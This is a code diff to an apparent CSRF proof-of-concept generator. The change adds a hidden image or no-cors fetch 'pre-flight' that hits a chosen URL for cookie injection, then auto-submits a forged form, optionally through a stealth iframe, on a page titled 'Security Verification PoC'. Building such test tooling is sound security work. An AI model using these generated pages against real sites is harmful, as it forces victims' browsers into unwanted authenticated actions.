@@ -1,5 +1,5 @@
 import { ParsedRequest } from '../../types';
-import { PocGeneratorOptions, escapeHtml } from './types';
+import { PocGeneratorOptions, escapeHtml, escapeJsString, extractPreflightUrl } from './types';
 import { parseUrlEncodedBody } from '../parser/httpParser';
 
 /**
@@ -23,6 +23,19 @@ export function generateHtmlFormPoc(
   const iframeName = 'csrf_forge_stealth_frame';
   const formId = 'csrf_form';
 
+  const preflight =
+    options.preflight?.enabled && options.preflight.url?.trim()
+      ? {
+          url: extractPreflightUrl(options.preflight.url),
+          mode: options.preflight.triggerMode || 'onerror',
+        }
+      : null;
+
+  const submitStatement =
+    delayMs > 0
+      ? `setTimeout(function() { document.getElementById('${formId}').submit(); }, ${delayMs});`
+      : `document.getElementById('${formId}').submit();`;
+
   const inputsHtml = Object.entries(bodyParams)
     .map(
       ([key, val]) =>
@@ -30,8 +43,25 @@ export function generateHtmlFormPoc(
     )
     .join('\n');
 
+  let preflightHtml = '';
   let scriptHtml = '';
-  if (autoSubmit) {
+
+  if (preflight) {
+    if (preflight.mode === 'fetch') {
+      preflightHtml = `\n    <!-- Pre-flight trigger via Fetch API -->\n    <script>
+      fetch(${escapeJsString(preflight.url)}, { mode: 'no-cors' })
+        .finally(function() {
+          ${autoSubmit ? submitStatement : '// Pre-flight executed; waiting for manual submission'}
+        });
+    </script>\n`;
+    } else {
+      const eventAttr = preflight.mode === 'onload' ? 'onload' : 'onerror';
+      const handler = autoSubmit ? ` ${eventAttr}="${submitStatement}"` : '';
+      preflightHtml = `\n    <!-- Pre-flight trigger / Cookie injection payload (${preflight.mode}) -->\n    <img src="${escapeHtml(
+        preflight.url
+      )}"${handler} style="display:none;" />\n`;
+    }
+  } else if (autoSubmit) {
     if (delayMs > 0) {
       scriptHtml = `
     <script>
@@ -58,8 +88,8 @@ export function generateHtmlFormPoc(
     CSRF Forge Proof of Concept
     Target URL: ${escapeHtml(targetUrl)}
     Method: ${method}
-    Vector: HTML Form Submission
-    Generated: ${new Date().toISOString()}
+    Vector: HTML Form Submission${preflight ? ` with Pre-flight Cookie Injection (${preflight.mode})` : ''}
+    ${preflight ? `Pre-flight URL: ${escapeHtml(preflight.url)}\n    ` : ''}Generated: ${new Date().toISOString()}
   -->\n`
     : '';
 
@@ -70,7 +100,7 @@ export function generateHtmlFormPoc(
   <title>Security Verification PoC</title>
 </head>
 <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
-${commentsHeader}${iframeHtml}    <form id="${formId}" action="${escapeHtml(targetUrl)}" method="${method}"${
+${commentsHeader}${iframeHtml}${preflightHtml}    <form id="${formId}" action="${escapeHtml(targetUrl)}" method="${method}"${
     stealthIframe ? ` target="${iframeName}"` : ''
   }>
 ${inputsHtml}
